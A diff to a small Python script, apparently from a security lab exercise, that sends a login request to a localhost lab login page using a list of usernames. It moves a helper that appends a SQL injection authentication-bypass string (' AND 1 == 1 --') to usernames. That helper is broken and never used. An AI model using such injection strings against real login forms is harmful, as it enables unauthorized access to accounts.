@@ -3,6 +3,11 @@
 import urllib.parse as urlp
 import urllib.request as urlr
 
+
+def inject_bypass(user):
+    user = user + " AND 1 == 1 --"
+
+
 usernames = {
     "root",
     "test",
@@ -34,7 +39,7 @@ usernames = {
 }
 
 
-url = "http://localhost"
+url = "http://localhost/lab09/login.php"
 
 params = {
     "u": "test",
@@ -47,6 +52,3 @@ url = url + "?" + query
 with urlr.urlopen(url) as response:
     response_text = response.read
     print(response_text)
-
-def inject_bypass(user):
-    user = user + " AND 1 == 1 --"
